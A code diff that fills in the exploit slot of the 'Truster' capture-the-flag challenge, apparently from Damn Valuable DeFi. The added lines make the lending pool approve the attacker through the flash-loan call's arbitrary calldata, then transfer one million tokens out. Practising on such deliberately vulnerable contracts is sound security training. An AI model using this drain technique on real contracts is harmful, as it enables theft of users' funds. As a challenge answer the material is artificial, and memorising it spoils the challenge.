@@ -1,4 +1,5 @@
 const { ether } = require('@openzeppelin/test-helpers');
+const { ethers } =  require('ethers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
@@ -30,6 +31,11 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        let ABI = ["function approve(address spender, uint256 amount)"];
+        let iface = new ethers.utils.Interface(ABI);
+        let data = iface.encodeFunctionData("approve", [attacker, ethers.utils.parseEther("1000000")]);
+        this.pool.flashLoan(0, attacker, this.token.address, data);
+        this.token.transferFrom(this.pool.address, attacker, ether("1000000"), { from: attacker });
     });
 
     after(async function () {
